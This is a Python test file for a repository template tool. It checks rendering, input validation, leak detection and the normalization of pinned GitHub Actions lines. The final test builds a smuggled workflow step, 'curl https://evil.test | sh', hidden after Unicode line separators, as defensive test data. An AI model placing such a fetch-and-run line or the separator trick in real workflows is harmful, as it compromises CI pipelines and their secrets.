"""The standard of a catalog repository: the template, `new`, the drift of a repository
from it (SD01 to SD05, SD08 to SD10) and `upgrade`. The template is rendered, never run; the shell of the `lab` action and of the
`result` job is taken out of the managed files and run with bash on hostile inputs; the repositories are real folders and real
git, made in a temporary home; there is no network and no Docker daemon. Compose 5 (a visible skip without) reads the sample
add-on in the day-one test.

`python3 -m tests.catalogs.test_standard --write` refreshes `templates/catalog/golden.json` after the level was raised on purpose."""

import contextlib
import io
import json
import os
import re
import shutil
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

from lab_ui.catalogs import audit, gitx, manifest, standard
from lab_ui.catalogs.rules import commits, workflows
from lab_ui.catalogs.tree import FolderTree, ListTree
from tests import Case
from tests.data.standard import support
from tests.data.standard.support import LAB_COMMIT, NEWER_COMMIT, params, render

ANY_PLACEHOLDER = re.compile(r"__[A-Z][A-Z0-9_]*[A-Z0-9]__")

CO_AUTHORED = "Co-" + "authored-by"
GENERATED = "Generated " + "with"
EVERYTHING = {"images": "ghcr.io/acme/lab-hub", "with": ["e2e"]}


def tree_of(files):
    return ListTree.from_files({path: data for path, data in files.items()})


def at(level, **more):
    """A catalog that an older level left, as this Lab meets it: `standard.json` and the markers say `level`, the files of later
    levels are not there, and `ci.yml` holds a line the Lab changed since (from 3 on it has a registry and the e2e module)."""
    files = render(**(EVERYTHING if level >= 3 else {}), **more)
    later = {each["path"] for each in standard.manifest()["files"] if each["since"] > level}
    now, then = b"catalog standard %d:" % standard.LEVEL, b"catalog standard %d:" % level
    out = {path: data.replace(now, then) for path, data in files.items() if path not in later}
    out[".github/standard.json"] = out[".github/standard.json"].replace(b'"standard": %d' % standard.LEVEL, b'"standard": %d' % level)
    out[".github/workflows/ci.yml"] = out[".github/workflows/ci.yml"].replace(b"timeout-minutes: 15", b"timeout-minutes: 14", 1)
    return out


def codes(found):
    return sorted(each.code for each in found)


def where(found, code):
    return sorted(each.path for each in found if each.code == code)


def edited(files, path, change):
    out = dict(files)
    out[path] = change(out[path].decode("utf-8")).encode("utf-8")
    return out


def blank(text, anchor, depth=1):
    """The lines of `text` under the first line that contains `anchor`, up to the next line that is not indented deeper, as a
    dedented block: the `run:` of a step, taken out of a managed workflow so that it can be run."""
    lines = text.split("\n")
    start = next(i for i, line in enumerate(lines) if anchor in line)
    out = []
    for _ in range(depth):
        start = next(i for i in range(start + 1, len(lines)) if re.match(r"\s*(?:- )?run: \|\s*$", lines[i]))
    indent = len(lines[start]) - len(lines[start].lstrip()) + (2 if lines[start].lstrip().startswith("- ") else 0)
    for line in lines[start + 1:]:
        if line.strip() and len(line) - len(line.lstrip()) <= indent:
            break
        out.append(line[indent + 2:] if line.strip() else "")
    return "\n".join(out).rstrip() + "\n"


class Template(unittest.TestCase):
    """The folder `lab-ui/templates/catalog`: what is in it, and that it is consistent."""

    def test_the_level_is_nine_and_each_level_has_its_note(self):
        # Levels 4 to 6 add no file: they change those that are there, so that a catalog below them is behind, not edited by hand.
        # Level 7 adds versions.yml; levels 8 and 9 add no file
        self.assertEqual(standard.LEVEL, 9)
        self.assertEqual(sorted(standard.manifest()["notes"]), ["1", "2", "3", "4", "5", "6", "7", "8", "9"])
        self.assertEqual(max(each["since"] for each in standard.manifest()["files"]), 7)

    def test_every_file_of_the_template_is_listed_and_every_listed_file_is_there(self):
        data = standard.manifest()
        listed = {"licenses/AGPL-3.0-only.txt", "licenses/Apache-2.0.txt", "licenses/MIT.txt", "licenses/other.txt", "manifest.json",
                  "golden.json"}
        for each in data["files"]:
            if each["class"] == "managed":
                listed.add("managed/" + each["path"])
            elif each.get("tool") or each.get("license"):
                continue
            else:
                listed.add("seeded/" + each["path"])
                if each.get("local"):
                    listed.add("seeded/" + each["local"])
        found = {str(path.relative_to(standard.TEMPLATE)) for path in standard.TEMPLATE.rglob("*") if path.is_file()}
        self.assertEqual((sorted(found - listed), sorted(listed - found)), ([], []))

    def test_a_managed_file_has_no_placeholder_and_a_seeded_file_has_only_known_ones(self):
        for path in (standard.TEMPLATE / "managed").rglob("*"):
            if path.is_file():
                self.assertEqual(ANY_PLACEHOLDER.findall(path.read_text(encoding="utf-8")), [], str(path))
        known = {f"__{name}__" for name in standard.PLACEHOLDERS}
        for path in list((standard.TEMPLATE / "seeded").rglob("*")) + list((standard.TEMPLATE / "licenses").rglob("*")):
            if path.is_file():
                self.assertLessEqual(set(ANY_PLACEHOLDER.findall(path.read_text(encoding="utf-8"))) - {"__pycache__"}, known,
                                     str(path))

    def test_a_managed_file_starts_with_its_marker(self):
        for each in standard.manifest()["files"]:
            if each["class"] != "managed":
                continue
            text = (standard.TEMPLATE / "managed" / each["path"]).read_text(encoding="utf-8")
            self.assertEqual(standard.marker_level(text, each["path"]), standard.LEVEL, each["path"])

    def test_no_managed_file_has_a_tab_or_trailing_blank_except_the_make_recipes(self):
        for each in standard.manifest()["files"]:
            if each["class"] == "managed":
                text = (standard.TEMPLATE / "managed" / each["path"]).read_text(encoding="utf-8")
                self.assertFalse(re.search(r"[ \t]+$", text, re.M), each["path"])
                if not each["path"].endswith(".mk"):
                    self.assertNotIn("\t", text, each["path"])
                self.assertTrue(text.endswith("\n") and not text.endswith("\n\n"), each["path"])

    def test_the_four_rulesets_are_the_shapes_of_section_4_3(self):
        folder = standard.TEMPLATE / "managed" / ".github" / "rulesets"
        found = {name: json.loads((folder / f"{name}.json").read_text(encoding="utf-8")) for name in
                 ("default-branch", "tags", "push", "protected-paths")}
        self.assertEqual({name: data["name"] for name, data in found.items()},
                         {"default-branch": "catalog-main", "tags": "catalog-tags", "push": "catalog-push",
                          "protected-paths": "catalog-protected-paths"})
        checks = [rule for rule in found["default-branch"]["rules"] if rule["type"] == "required_status_checks"][0]
        self.assertEqual(checks["parameters"]["required_status_checks"], [{"context": "Catalog CI result", "integration_id": 15368}])
        deploy_key = {"actor_id": None, "actor_type": "DeployKey", "bypass_mode": "always"}   # versions.yml writes main and a tag
        self.assertEqual(found["default-branch"]["bypass_actors"], [deploy_key])
        self.assertEqual(found["push"]["bypass_actors"], [])
        self.assertEqual(found["tags"]["bypass_actors"], [{"actor_id": 5, "actor_type": "RepositoryRole", "bypass_mode": "always"}, deploy_key])
        for data in found.values():
            self.assertTrue(data["_managed"].startswith(f"Managed by the Lab catalog standard {standard.LEVEL}: "))

    def test_the_rulesets_are_what_repo_settings_sends(self):
        from lab_ui.catalogs import settings
        self.assertEqual(sorted(settings.load_rulesets()), ["history", "main", "paths", "push", "tag_history", "tags"])

    def test_the_fleet_may_change_only_the_folders_of_the_managed_files(self):
        from lab_ui.catalogs import fleet
        self.assertEqual(fleet.MANAGED_ROOTS, standard.managed_roots())
        self.assertEqual(standard.managed_roots(), (".catalog/", ".github/", ".github/actions/lab/", ".github/rulesets/",
                                                    ".github/workflows/"))
        for path in standard.managed_paths():
            self.assertTrue(path.startswith(fleet.MANAGED_ROOTS), path)
        self.assertIn(".github/standard.json", standard.managed_paths())
        self.assertNotIn(".github/CODEOWNERS", standard.managed_paths())
        self.assertNotIn("Makefile", standard.managed_paths())

    def test_the_pins_of_the_template_are_full_commits_with_a_tag_in_a_comment(self):
        for each in standard.manifest()["files"]:
            if each["class"] == "managed" and each["path"].endswith(".yml"):
                text = (standard.TEMPLATE / "managed" / each["path"]).read_text(encoding="utf-8")
                for line in text.split("\n"):
                    found = standard._uses(line)
                    if "uses:" in line and not line.strip().startswith("#") and "uses: ./" not in line:
                        self.assertIsNotNone(found, line)
                        self.assertRegex(found[3], r"^# v\d+\.\d+\.\d+$", line)


class Golden(Case):
    """The engine's test renders the template, compares it with golden.json, and fails a change without a bump."""

    def test_the_golden_file_is_what_the_template_renders(self):
        self.assertEqual(standard.golden_problems(), [], "refresh it with python3 -m tests.catalogs.test_standard --write")

    def test_a_change_of_the_content_of_a_managed_file_fails_without_a_bump(self):
        template = support.copy_template(self)
        path = template / "managed" / ".github" / "workflows" / "ci.yml"
        path.write_text(path.read_text(encoding="utf-8").replace("timeout-minutes: 15", "timeout-minutes: 16", 1), encoding="utf-8")
        problems = standard.golden_problems()
        self.assertEqual(problems[0], standard.GOLDEN_MESSAGE)   # the level the Lab ships: the message of 3.4, as it is
        self.assertEqual(problems[1:], ["  .github/workflows/ci.yml"])

    def test_a_change_of_a_pin_is_not_a_change(self):
        template = support.copy_template(self)
        path = template / "managed" / ".github" / "workflows" / "ci.yml"
        text = path.read_text(encoding="utf-8")
        path.write_text(text.replace("3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1", "f" * 40 + " # v7.0.2"), encoding="utf-8")
        self.assertNotEqual(path.read_text(encoding="utf-8"), text)
        self.assertEqual(standard.golden_problems(), [])

    def test_a_swapped_action_is_a_change(self):
        template = support.copy_template(self)
        path = template / "managed" / ".github" / "workflows" / "ci.yml"
        path.write_text(path.read_text(encoding="utf-8").replace("actions/checkout@", "evil/checkout@", 1), encoding="utf-8")
        self.assertTrue(standard.golden_problems())

    def test_a_change_of_the_level_without_a_refresh_fails_and_a_refresh_passes(self):
        template = support.copy_template(self)
        support.set_level(template, 2)
        self.patch(standard, "LEVEL", 2)
        problems = standard.golden_problems()
        self.assertEqual(problems[0], standard.GOLDEN_MESSAGE)
        self.assertIn("  golden.json is for level 9, the template says 2", problems)
        standard.write_golden()
        self.assertEqual(standard.golden_problems(), [])

    def test_the_golden_file_of_a_template_without_one_is_a_failure(self):
        template = support.copy_template(self)
        (template / "golden.json").unlink()
        self.assertEqual(standard.golden_problems(), [standard.GOLDEN_MESSAGE, "  golden.json cannot be read"])


class Values(unittest.TestCase):
    """What `new` is given is checked as a whole before anything is rendered."""

    def refused(self, **more):
        with self.assertRaises(standard.TemplateError) as caught:
            standard.render_new(params(**more))
        self.assertNotIn("\n", str(caught.exception))
        return str(caught.exception)

    def test_missing_parameters_are_listed(self):
        with self.assertRaises(standard.TemplateError) as caught:
            standard.render_new({"id": "acme-hub"})
        self.assertEqual(str(caught.exception), "Missing: name, maintainers, lab_repository, lab_ref.")

    def test_a_folder_catalog_needs_an_id_and_a_name_only(self):
        with self.assertRaisesRegex(standard.TemplateError, "^Missing: id, name.$"):
            standard.render_new({"local": True})
        self.assertTrue(standard.render_new({"local": True, "id": "mine", "name": "Mine"}))

    def test_an_id_is_a_namespace_that_is_not_reserved(self):
        for bad in ("Acme", "a", "1ab", "ab_c", "-ab", "ab-", "a" * 25, "gravitee", "local", "lab", "core", "acme hub", "acme\nhub", 5):
            with mock.patch.object(standard.defaults, "read", return_value=[]):
                self.assertIn("is not a catalog id", self.refused(id=bad), bad)

    def test_the_id_the_labs_default_file_lists_is_one_though_the_lab_keeps_the_word(self):
        listed = [{"id": "gravitee", "name": "Gravitee public"}]
        with mock.patch.object(standard.defaults, "read", return_value=listed):
            self.assertEqual(standard.values(params(id="gravitee"))["id"], "gravitee")
            self.assertIn("is not a catalog id", self.refused(id="core"))
            self.assertIn("is not a catalog id", self.refused(id="local"))

    def test_a_name_is_one_short_clean_line(self):
        for bad in ("<b>x</b>", "a`b", "a\\b", "a\u202eb".replace("\\u202e", chr(0x202e)), "a" + chr(0x200b) + "b", "x" * 41,
                    "bell" + chr(7), "\x1b[31mred"):
            self.assertRegex(self.refused(name=bad), "name (is at most 40|holds a character)", repr(bad))
        self.assertEqual(standard.values(params(name="  Acme   Hub "))["name"], "Acme Hub")

    def test_a_look_alike_of_a_forbidden_character_is_the_character(self):
        # NFKC comes first: the fullwidth and small forms are < > and ` once normalized, and would be written into README.md,
        # AGENTS.md and the license text
        for bad in ("Acme \uff1chub\uff1e", "\uff1cscript\uff1e", "a\uff40b", "a\ufe64b\ufe65", "\uff1c"):
            self.assertIn("holds a character", self.refused(name=bad), repr(bad))
        self.assertIn("holds a character", self.refused(description="\uff1cimg\uff1e"))
        self.assertIn("holds a character", self.refused(security_contact="\uff1c@x\uff1e"))
        self.assertEqual(standard.values(params(name="\ufb01sh \u2460"))["name"], "fish 1")   # a ligature and a circled digit are plain
        files = standard.render_new(params(name="\ufb01sh Hub"))
        self.assertIn(b"# fish Hub", files["README.md"])
        self.assertTrue(all("\ufb01" not in data.decode() for data in files.values()))

    def test_a_name_the_lab_keeps_is_refused_as_check_would_refuse_it(self):
        from lab_ui.catalogs import manifest
        listed = [{"id": "gravitee", "name": "Gravitee public"}]
        meta = {"schema": 1, "id": "acme-hub", "description": "d", "version": "1.0.0", "lab": 1, "license": "MIT"}
        with mock.patch.object(standard.defaults, "read", return_value=listed):
            for bad in ("Official", "verified", "This  Machine", "PERSONAL", "\uff2ffficial", "Gravitee PUBLIC", " gravitee public "):
                message = self.refused(name=bad)
                self.assertIn("cannot be the name of a catalog", message, bad)
                self.assertIn("Fix: choose another name with --name.", message)
                problems = manifest.validate_catalog({**meta, "name": bad}, borrowed=[one["name"] for one in listed])
                self.assertTrue(any(problem.startswith("name cannot be") for problem in problems), (bad, problems))
            self.assertEqual(standard.values(params(id="gravitee", name="Gravitee public"))["name"], "Gravitee public")   # its own
            self.assertEqual(standard.values(params(name="Official Hub"))["name"], "Official Hub")                      # the whole name only
            self.assertEqual(standard.values({"local": True, "id": "mine", "name": "Mine"})["name"], "Mine")
            with self.assertRaises(standard.TemplateError):
                standard.values({"local": True, "id": "mine", "name": "Official"})

    def test_a_description_is_at_most_ninety_characters(self):
        self.assertIn("at most 90", self.refused(description="d" * 91))
        self.assertEqual(standard.values(params())["description"], "Demos for Gravitee Lab")

    def test_a_license_is_an_identifier_and_known_ones_are_spelt_the_standard_way(self):
        for bad in ("Apache 2.0", "mit\n", "-mit", "x" * 65, "MIT;rm", "\u00e9"):
            self.assertIn("is not a license identifier", self.refused(license=bad), bad)
        self.assertEqual(standard.values(params(license="apache-2.0"))["license"], "Apache-2.0")
        self.assertEqual(standard.values(params(license="agpl-3.0-only"))["license"], "AGPL-3.0-only")
        self.assertEqual(standard.values(params(license="BSD-3-Clause"))["license"], "BSD-3-Clause")

    def test_a_registry_prefix_is_a_host_and_a_path_in_lower_case_with_no_tag(self):
        for bad in ("ghcr.io", "GHCR.io/acme/x", "ghcr.io/acme/x:latest", "https://ghcr.io/acme/x", "ghcr.io/acme/x y", "ghcr.io//x",
                    "ghcr.io/acme/x\n"):
            self.assertIn("is not a registry prefix", self.refused(images=bad), bad)
        self.assertEqual(standard.values(params(images="ghcr.io/acme/lab-hub"))["images"], "ghcr.io/acme/lab-hub")
        self.assertEqual(standard.values(params(images="localhost:5000/acme/lab-hub"))["images"], "localhost:5000/acme/lab-hub")

    def test_the_lab_is_an_address_and_a_full_commit(self):
        for bad in ("acme", "acme/lab/x", "acme/..", "a b/c", "acme/lab\n", "../lab"):
            self.assertIn("Lab address", self.refused(lab_repository=bad), bad)
        for bad in ("main", "v1.0.0", "0123456", LAB_COMMIT.upper(), LAB_COMMIT + "0", LAB_COMMIT[:39] + "g", LAB_COMMIT + "\n"):
            self.assertIn("full commit", self.refused(lab_ref=bad), bad)

    def test_with_and_platforms(self):
        self.assertIn("--with takes e2e", self.refused(**{"with": ["gold"]}))
        self.assertIn("--platforms", self.refused(platforms=["linux/riscv64"]))
        self.assertIn("--platforms", self.refused(platforms=["linux/amd64", "linux/amd64"]))
        self.assertEqual(standard.values(params(platforms="linux/amd64,linux/arm64"))["platforms"], ["linux/amd64", "linux/arm64"])
        self.assertEqual(standard.values(params())["platforms"], ["linux/amd64"])

    def test_what_is_far_too_long_is_refused_at_once(self):
        start = time.process_time()
        for more in ({"name": "x" * 1000000}, {"images": "a/" * 500000}, {"license": "a" * 1000000}, {"description": "d" * 1000000},
                     {"id": "a" * 1000000}, {"lab_repository": "a/" + "b" * 1000000}, {"maintainers": "@" + "a" * 1000000},
                     {"security_contact": "c" * 1000000}):
            with self.assertRaises(standard.TemplateError):
                standard.render_new(params(**more))
        self.assertLess(time.process_time() - start, 1.0)

    def test_a_folder_catalog_has_no_workflows_to_choose(self):
        with self.assertRaisesRegex(standard.TemplateError, "--local takes no --with"):
            standard.values({"local": True, "id": "mine", "name": "Mine", "with": ["e2e"]})

    def test_the_security_contact_is_the_first_maintainer_until_one_is_given(self):
        self.assertEqual(standard.values(params(maintainers="@acme/maintainers,@alice"))["security_contact"], "@acme/maintainers")
        self.assertEqual(standard.values(params(security_contact="security@acme.example"))["security_contact"], "security@acme.example")
        self.assertIn("security contact", self.refused(security_contact="a\nb"))


class Rendering(unittest.TestCase):

    def test_rendering_twice_gives_identical_bytes(self):
        self.assertEqual(render(**EVERYTHING), render(**EVERYTHING))

    def test_the_files_of_a_new_catalog(self):
        files = render()
        for path in (".github/workflows/ci.yml", ".github/actions/lab/action.yml", ".catalog/standard.mk", ".github/dependabot.yml",
                     ".github/CODEOWNERS", ".github/standard.json", ".github/PULL_REQUEST_TEMPLATE.md", "REVIEWING.md", "Makefile",
                     "addons/hello/compose.yml", "addons/hello/README.md", "catalog.yml", "LICENSE", "AGENTS.md", "CLAUDE.md"):
            self.assertIn(path, files)
        for name in ("default-branch", "tags", "push", "protected-paths"):
            self.assertIn(f".github/rulesets/{name}.json", files)
        for path in (".github/workflows/publish.yml", ".github/workflows/e2e.yml"):
            self.assertNotIn(path, files)

    def test_a_new_catalog_has_nightly_and_publishes_only_with_a_registry(self):
        files = render()
        self.assertEqual(len(files), 31)
        self.assertEqual([path for path in files if path.startswith(".github/workflows/")],
                         [".github/workflows/ci.yml", ".github/workflows/nightly.yml"])
        self.assertIn(".github/workflows/publish.yml", render(images="ghcr.io/acme/lab-hub"))
        self.assertNotIn(".github/workflows/e2e.yml", render(images="ghcr.io/acme/lab-hub"))

    def test_the_e2e_module_comes_on_request(self):
        both = render(**EVERYTHING)
        self.assertIn(".github/workflows/publish.yml", both)
        self.assertIn(".github/workflows/e2e.yml", both)
        self.assertIn(".github/workflows/versions.yml", both)

    def test_no_placeholder_is_left(self):
        for more in ({}, {"images": "ghcr.io/acme/lab-hub"}, {"license": "MIT"}, {"license": "UNLICENSED"}, {"name": "A \"quoted\" Hub"}):
            for path, data in render(**more).items():
                self.assertEqual(ANY_PLACEHOLDER.findall(data.decode("utf-8")), [], path)
        for path, data in standard.render_new({"local": True, "id": "mine", "name": "Mine"}).items():
            self.assertEqual(ANY_PLACEHOLDER.findall(data.decode("utf-8")), [], path)

    def test_a_value_that_looks_like_a_placeholder_is_not_read_again(self):
        files = render(name="__CATALOG_ID__ Hub", description="about __LAB_REF__")
        self.assertIn(b'name: "__CATALOG_ID__ Hub"', files["catalog.yml"])
        self.assertIn(b'description: "about __LAB_REF__"', files["catalog.yml"])

    def test_the_catalog_yml_holds_what_was_given_and_the_registry_line_only_when_given(self):
        text = render(images="ghcr.io/acme/lab-hub")["catalog.yml"].decode()
        self.assertIn('  id: "acme-hub"\n', text)
        self.assertIn('  name: "Acme Hub"\n', text)
        self.assertIn('  license: "Apache-2.0"\n', text)
        self.assertIn("  images: ghcr.io/acme/lab-hub\n", text)
        self.assertNotIn("images", render()["catalog.yml"].decode().replace("make release when items", ""))

    def test_words_that_yaml_reads_as_something_else_stay_words(self):
        from lab_ui.catalogs.rules import catalog_meta
        for ident, licence in (("true", "no"), ("null", "1.0"), ("off", "2024-01-01"), ("false", "true"), ("yes", "1e3"), ("nan", "0x1f")):
            text = render(id=ident, license=licence)["catalog.yml"].decode()
            self.assertIn(f'  id: "{ident}"\n', text)
            self.assertIn(f'  license: "{licence}"\n', text)
            meta = catalog_meta(text)
            self.assertEqual((meta["id"], meta["license"]), (ident, licence))

    def test_the_lab_reads_those_words_as_the_words_they_are(self):
        from tests import fixtures
        if not fixtures.have_compose():
            support.skip("the Docker CLI with Compose 5 or later is not installed, catalog.yml was not read by Compose")
        from lab_ui.docker import compose
        folder = Path(tempfile.mkdtemp(prefix="gravitee-lab-yaml-")).resolve()
        self.addCleanup(shutil.rmtree, folder, True)
        for ident, licence in (("true", "no"), ("null", "1.0"), ("off", "2024-01-01")):
            (folder / "catalog.yml").write_bytes(render(id=ident, license=licence)["catalog.yml"])
            block = compose.raw(str(folder / "catalog.yml"))["x-gravitee-catalog"]
            self.assertEqual((block["id"], block["license"]), (ident, licence))

    def test_a_name_with_a_quote_or_a_colon_stays_one_scalar(self):
        from lab_ui.catalogs.rules import catalog_meta
        for name in ('Say "hi": a #hub', "It's: here", "- not a list", "x: y"):
            meta = catalog_meta(render(name=name)["catalog.yml"].decode())
            self.assertEqual(meta["name"], name)
            self.assertEqual(meta["id"], "acme-hub")

    def test_the_standard_json_is_the_example_of_section_3_2(self):
        text = render()[".github/standard.json"].decode()
        self.assertEqual(text, '{\n  "form": "inline",\n  "lab": {\n    "ref": "%s",\n    "repository": "acme/gravitee-lab"\n  },\n'
                               '  "platforms": [\n    "linux/amd64"\n  ],\n  "standard": 9\n}\n' % LAB_COMMIT)
        self.assertEqual(json.loads(text)["standard"], standard.LEVEL)
        both = standard.render_new(params(platforms="linux/amd64,linux/arm64"))[".github/standard.json"].decode()
        self.assertEqual(json.loads(both)["platforms"], ["linux/amd64", "linux/arm64"])

    def test_codeowners_has_the_two_lines(self):
        text = render(maintainers="@acme/maintainers,@alice")[".github/CODEOWNERS"].decode()
        self.assertEqual([line for line in text.split("\n") if not line.startswith("#") and line],
                         ["*                       @acme/maintainers @alice", "/.github/               @acme/maintainers @alice"])

    def test_the_license_text_is_the_standard_text_or_a_stub(self):
        self.assertIn(b"Apache License\n                           Version 2.0, January 2004", render(license="Apache-2.0")["LICENSE"])
        self.assertIn(b"GNU AFFERO GENERAL PUBLIC LICENSE\n                       Version 3, 19 November 2007",
                      render(license="AGPL-3.0-only")["LICENSE"])
        mit = render(license="MIT")["LICENSE"].decode()
        self.assertTrue(mit.startswith("MIT License\n\nCopyright (c) Acme Hub contributors\n"))
        stub = render(license="BSD-3-Clause")["LICENSE"].decode()
        self.assertIn("says BSD-3-Clause", stub)
        self.assertIn("No license text yet", render(license="UNLICENSED")["LICENSE"].decode())

    def test_the_license_text_is_the_one_the_structure_rules_know_by_its_words(self):
        from lab_ui.catalogs.rules import context, structure
        for name in ("AGPL-3.0-only", "Apache-2.0", "MIT", "BSD-3-Clause", "UNLICENSED"):
            tree = tree_of(render(license=name))
            self.assertEqual([each for each in structure.check(tree, context(tree)) if each.code == "ST18"], [], name)
        wrong = tree_of({**render(license="MIT"), "LICENSE": render(license="Apache-2.0")["LICENSE"]})
        self.assertEqual([each.code for each in structure.check(wrong, context(wrong)) if each.code == "ST18"], ["ST18"])

    def test_the_sample_add_on_names_everything_with_the_catalog_id(self):
        text = render(id="acme-hub")["addons/hello/compose.yml"].decode()
        self.assertIn("  acme-hub-hello:\n", text)
        self.assertIn("container_name: gio-acme-hub-hello", text)
        self.assertIn("${ACME_HUB_HELLO_VERSION:-v1.12.0}", text)
        self.assertIn("ACME_HUB_HELLO_VERSION", render(id="acme-hub")["addons/hello/README.md"].decode())
        self.assertIn("${MY_SHOP_HELLO_VERSION:-v1.12.0}", render(id="my-shop")["addons/hello/compose.yml"].decode())

    def test_the_makefile_includes_the_standard_and_the_standard_has_the_targets(self):
        self.assertTrue(render()["Makefile"].decode().startswith("include .catalog/standard.mk\n"))
        mk = render()[".catalog/standard.mk"].decode()
        self.assertIn(".PHONY: dev check ci index upgrade settings release explain", mk)

    def test_the_folder_catalog_is_five_things_and_a_license(self):
        files = standard.render_new({"local": True, "id": "mine", "name": "Mine"})
        self.assertEqual(sorted(files), [".gitignore", "LICENSE", "Makefile", "README.md", "addons/hello/README.md",
                                         "addons/hello/compose.yml", "catalog.yml"])
        make = files["Makefile"].decode()
        self.assertIn(".PHONY: dev check", make)
        self.assertNotIn("standard.mk", make)
        self.assertNotIn("upgrade", make)
        self.assertIn("No license text yet", files["LICENSE"].decode())
        self.assertNotIn(b".github", b"".join(files.values()).replace(b"https://github.com", b""))

    def test_the_makefile_recipes_have_real_tabs(self):
        for text in (render()[".catalog/standard.mk"].decode(), standard.render_new({"local": True, "id": "mine", "name": "Mine"})[
                "Makefile"].decode()):
            recipes = [line for line in text.split("\n") if line.startswith(("\t", "    @"))]
            self.assertTrue(recipes)
            self.assertTrue(all(line.startswith("\t@") for line in recipes), recipes)

    def test_every_json_file_is_json_and_every_yaml_file_is_yaml(self):
        for path, data in render(**EVERYTHING).items():
            if path.endswith(".json"):
                self.assertIsInstance(json.loads(data.decode("utf-8")), dict, path)
        try:
            import yaml
        except ImportError:
            support.skip("PyYAML is not installed, the YAML files of the template were not parsed (the JSON ones were)")
        for path, data in render(**EVERYTHING).items():
            if path.endswith((".yml", ".yaml")):
                self.assertIsNotNone(yaml.safe_load(data.decode("utf-8")), path)

    def test_the_template_of_the_engine_renders_files_that_are_valid_utf8_with_lf_and_no_bom(self):
        for path, data in render(**EVERYTHING).items():
            text = data.decode("utf-8")
            self.assertNotIn("\r", text, path)
            self.assertFalse(text.startswith("\ufeff"), path)
            self.assertTrue(text.endswith("\n"), path)


class Leaks(unittest.TestCase):
    """No engine owner, address or tool credit in any template file or in anything it renders."""

    OWNERS = re.compile(r"dobl1|graviteesource|gravitee-io|gravitee-lab-catalog|dorian|blanc\b|internal\.gravitee", re.I)
    ADDRESSES = re.compile(r"github\.com/(?!__LAB_REPOSITORY__|acme/)|ghcr\.io/(?!acme/)|https://[a-z0-9.-]+\.[a-z]{2,}/(?!__)", re.I)
    ALLOWED_LINKS = ("https://spdx.org/licenses/", "https://github.com/__LAB_REPOSITORY__", "http://localhost", "https://github.com/acme",
                     "http://www.apache.org/licenses/", "https://www.gnu.org/licenses/", "https://fsf.org/", "https://www.apache.org",
                     "https://github.com/features")

    def files(self):
        for path in standard.TEMPLATE.rglob("*"):
            if path.is_file():
                yield str(path.relative_to(standard.TEMPLATE)), path.read_text(encoding="utf-8")
        for path, data in render(**EVERYTHING).items():
            yield f"rendered {path}", data.decode("utf-8")
        for path, data in standard.render_new({"local": True, "id": "mine", "name": "Mine"}).items():
            yield f"local {path}", data.decode("utf-8")

    def test_no_owner_of_the_engine_and_no_private_name(self):
        for name, text in self.files():
            self.assertIsNone(self.OWNERS.search(text), name)

    def test_the_only_addresses_are_the_lab_of_the_parameters_and_the_texts_of_licenses(self):
        for name, text in self.files():
            if name.startswith("golden") or name.startswith("manifest"):
                continue
            for url in re.findall(r"https?://[^\s)>\"'`]+", text):
                self.assertTrue(url.startswith(self.ALLOWED_LINKS), f"{name}: {url}")

    def test_no_tool_credit_no_co_author_trailer_no_generated_by_line(self):
        for name, text in self.files():
            self.assertNotIn(CO_AUTHORED.lower(), text.lower(), name)
            self.assertNotIn(GENERATED.lower(), text.lower(), name)
            self.assertIsNone(commits.NAMES.search(text), name)
            self.assertIsNone(commits.ADDRESSES.search(text.lower()), name)
            for line in text.split("\n"):
                self.assertIsNone(commits.CREDITS.search(line), f"{name}: {line}")
            self.assertNotIn("\U0001f916", text, name)

    def test_no_file_of_the_template_holds_an_invisible_character(self):
        bad = re.compile("[\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u206f\ufeff\u00ad]")
        for name, text in self.files():
            self.assertIsNone(bad.search(text), name)


class Normalizing(unittest.TestCase):

    def test_line_ends_trailing_blanks_and_the_final_newline(self):
        self.assertEqual(standard.normalize("a  \r\nb\t\r\n\r\n\r\n"), "a\nb\n")
        self.assertEqual(standard.normalize("a\rb"), "a\nb\n")
        self.assertEqual(standard.normalize("a"), "a\n")
        self.assertEqual(standard.normalize(""), "\n")
        self.assertEqual(standard.normalize("a\n\n\n"), standard.normalize("a\n"))
        self.assertNotEqual(standard.normalize("a\n\nb\n"), standard.normalize("a\nb\n"))

    def test_a_dependabot_bump_is_not_a_difference(self):
        old = "      - uses: actions/checkout@" + "3d3c42e5aac5ba805825da76410c181273ba90b1" + " # v7.0.1\n"
        new = "      - uses: actions/checkout@" + "f" * 40 + " # v8.1.0\n"
        self.assertEqual(standard.normalize(old), standard.normalize(new))
        self.assertEqual(standard.normalize(old), "      - uses: actions/checkout@<pin>\n")

    def test_the_pin_of_a_list_item_a_path_and_a_bare_line_are_all_read(self):
        sha = "a" * 40
        for line in (f"uses: owner/repo@{sha}", f"  - uses: owner/repo/sub/path@{sha} # v1", f"    uses:   owner/repo@{sha}   #  comment  ",
                     f"- uses: owner/repo@{sha}"):
            self.assertIn("@<pin>", standard.normalize(line), line)

    def test_an_action_swapped_is_a_difference(self):
        sha = "a" * 40
        self.assertNotEqual(standard.normalize(f"- uses: actions/checkout@{sha}"), standard.normalize(f"- uses: actions/evil@{sha}"))
        self.assertNotEqual(standard.normalize(f"- uses: actions/checkout@{sha}"), standard.normalize(f"- uses: evil/checkout@{sha}"))
        self.assertNotEqual(standard.normalize(f"- uses: docker/login-action/x@{sha}"), standard.normalize(f"- uses: docker/login-action@{sha}"))

    def test_what_is_not_a_pin_is_left_alone(self):
        for line in ("uses: ./local/action", "uses: owner/repo@v4", "uses: owner/repo@" + "a" * 39, "uses: owner/repo@" + "A" * 40,
                     "uses: owner/repo@" + "a" * 41, "  # uses: owner/repo@" + "a" * 40, "run: echo uses: owner/repo@" + "a" * 40,
                     "uses: owner@" + "a" * 40, "      - uses: ./.github/actions/lab  # owner/repo@" + "a" * 40):
            self.assertEqual(standard.normalize(line), line + "\n", line)

    def test_a_comment_after_a_pin_is_a_tag_and_cannot_hide_a_line(self):
        sha = "a" * 40
        plain = f"      - uses: actions/checkout@{sha} # v7.0.1\n"
        # a character that a YAML reader takes for a line break (or that no tag holds) ends the comment, so the line after it is read
        for sep in ("\u2028", "\u2029", "\u0085", "\x0b", "\x0c", "\x1c", "\x1d", "\x1e", "\x00", "\x7f", "\u202e", "\ufeff"):
            line = f"      - uses: actions/checkout@{sha} # v7.0.1{sep}      - run: curl https://evil.test | sh"
            self.assertIn("evil.test", standard.normalize(line), repr(sep))
            self.assertNotEqual(standard.comparable(line + "\n"), standard.comparable(plain), repr(sep))
